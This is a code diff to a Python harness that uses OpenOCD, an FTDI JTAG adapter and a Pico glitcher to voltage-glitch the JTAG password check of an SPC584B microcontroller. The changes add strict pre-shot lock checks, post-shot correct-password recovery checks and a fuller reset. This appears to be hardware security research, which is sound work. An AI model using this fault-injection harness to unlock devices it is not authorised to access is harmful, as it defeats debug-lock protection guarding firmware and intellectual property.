@@ -326,7 +326,10 @@ def reset_target(session: OpenOCDSession, hold_ms: int) -> None:
     time.sleep(hold_ms / 1000)
     session.command(f"irscan spc584b.tap 0x{DCI_CONTROL_INSTRUCTION:02x}")
     session.command("drscan spc584b.tap 32 0x00000000")
-    session.command("jtag arp_init")
+    # Reinitialize both reset lines and the scan chain. A failed locked-core
+    # halt can leave the adapter/target path in a state where raw IDCODE still
+    # works but a later valid password cannot restore core access.
+    session.command("jtag arp_init-reset")
     session.halted = False
     session.preserve_halt = False
 
@@ -334,7 +337,7 @@ def reset_target(session: OpenOCDSession, hold_ms: int) -> None:
 def reset_and_verify_target(
     session: OpenOCDSession, hold_ms: int, retries: int
 ) -> None:
-    """Re-arm password security and prove the external FTDI still sees the TAP."""
+    """Re-arm security, reset the FTDI path, and prove the TAP IDCODE."""
     observed: list[str] = []
     for _ in range(retries + 1):
         try:
@@ -444,6 +447,29 @@ def run_controls(
         )
 
 
+def prepare_glitched_submission(
+    session: OpenOCDSession, args: argparse.Namespace
+) -> None:
+    reset_and_verify_target(session, args.reset_hold_ms, args.health_retries)
+    if not args.strict_oracle:
+        return
+
+    locked = probe_debug(session, args.control_halt_timeout_ms)
+    if locked.state != "LOCKED_OR_UNRESPONSIVE":
+        raise ExperimentError(
+            "strict pre-shot lock gate failed after destructive reset without "
+            f"a password: {locked.state} detail={locked.detail}"
+        )
+    print(
+        "PRE_SHOT_LOCK_GATE=PASS "
+        f"result={locked.state} detail={locked.detail}",
+        flush=True,
+    )
+    # Reapply the same destructive reset after probing the locked core so the
+    # password transaction always begins from a fresh, equivalent state.
+    reset_and_verify_target(session, args.reset_hold_ms, args.health_retries)
+
+
 def run_glitched_submission(
     session: OpenOCDSession,
     glitcher: PicoGlitcher,
@@ -451,7 +477,7 @@ def run_glitched_submission(
     point: Point,
     args: argparse.Namespace,
 ) -> Result:
-    reset_and_verify_target(session, args.reset_hold_ms, args.health_retries)
+    prepare_glitched_submission(session, args)
     select_password_register(session)
 
     glitcher.edge_count_trigger(
@@ -685,6 +711,14 @@ def parse_args() -> argparse.Namespace:
     parser.add_argument("--control-halt-timeout-ms", type=int, default=2000)
     parser.add_argument("--block-timeout", type=float, default=2.0)
     parser.add_argument(
+        "--strict-oracle",
+        action="store_true",
+        help=(
+            "before every shot prove no-password denial after destructive reset, "
+            "then require correct-password recovery after every no-access result"
+        ),
+    )
+    parser.add_argument(
         "--high-power",
         action="store_true",
         help="use the high-power crowbar only after validating it on a scope",
@@ -779,9 +813,22 @@ def main() -> int:
         print("PASSWORD_SCAN=UNINTERRUPTED_256_BIT_DRSCAN", flush=True)
         print("TRIGGER_REFERENCE=TCK_EDGES_AFTER_PASSWORD_IR_SELECTION", flush=True)
         print("JTAG_CONTROLLER=EXTERNAL_FTDI_PERSISTENT_OPENOCD", flush=True)
-        print("TARGET_REARM=DCI_DESTRUCTIVE_RESET_POWER_CYCLE_EQUIVALENT", flush=True)
-        print("PRE_SHOT_GATE=EXPECTED_IDCODE", flush=True)
-        print("POST_SHOT_ORACLE=HALT_REGISTERS_LCSTAT_X3", flush=True)
+        print(
+            "TARGET_REARM=DCI_DESTRUCTIVE_RESET_PLUS_FTDI_TRST_SRST_REINIT",
+            flush=True,
+        )
+        if args.strict_oracle:
+            print(
+                "PRE_SHOT_GATE=EXPECTED_IDCODE_NO_PASSWORD_DENIAL_FRESH_RESET",
+                flush=True,
+            )
+            print(
+                "POST_SHOT_ORACLE=HALT_REGISTERS_LCSTAT_X3_CORRECT_PASSWORD_RECOVERY",
+                flush=True,
+            )
+        else:
+            print("PRE_SHOT_GATE=EXPECTED_IDCODE", flush=True)
+            print("POST_SHOT_ORACLE=HALT_REGISTERS_LCSTAT_X3", flush=True)
         print(f"PICO_PIO_TICK_NS={tick_ns}", flush=True)
 
         session = OpenOCDSession(openocd, args.adapter_speed_khz).__enter__()
@@ -828,6 +875,7 @@ def main() -> int:
                     "repeat",
                     "result",
                     "access_observed",
+                    "recovery_result",
                     "detail",
                 )
             )
@@ -859,11 +907,17 @@ def main() -> int:
                 result = run_glitched_submission(
                     session, glitcher, words, point, args
                 )
+
+            recovery: Result | None = None
+            if args.strict_oracle and not result.access_observed:
+                recovery = submit_without_glitch(session, correct_words, args)
+
             elapsed = max(time.monotonic() - started, 0.001)
             print(
                 f"ATTEMPT={attempt} edge_count={args.edge_count} "
                 f"delay_ns={point.delay_ns} length_ns={point.length_ns} "
                 f"repeat={point.repeat} result={result.state} "
+                f"recovery={recovery.state if recovery else 'not-run'} "
                 f"rate={(attempt + 1) / elapsed:.2f}/s detail={result.detail}",
                 flush=True,
             )
@@ -879,6 +933,7 @@ def main() -> int:
                         point.repeat,
                         result.state,
                         int(result.access_observed),
+                        recovery.state if recovery else "NOT_RUN",
                         result.detail,
                     )
                 )
@@ -888,6 +943,18 @@ def main() -> int:
                     (point.delay_ns, point.length_ns), {}
                 )
                 counts[result.state] = counts.get(result.state, 0) + 1
+
+            if recovery is not None:
+                if recovery.state != "ACCESS_JUN_SET":
+                    raise ExperimentError(
+                        "strict post-shot recovery failed after "
+                        f"{result.state}: {recovery.state} detail={recovery.detail}"
+                    )
+                print(
+                    f"POST_SHOT_RECOVERY=PASS attempt={attempt} "
+                    f"result={recovery.state} detail={recovery.detail}",
+                    flush=True,
+                )
 
             if result.state == "TRIGGER_TIMEOUT":
                 raise ExperimentError(
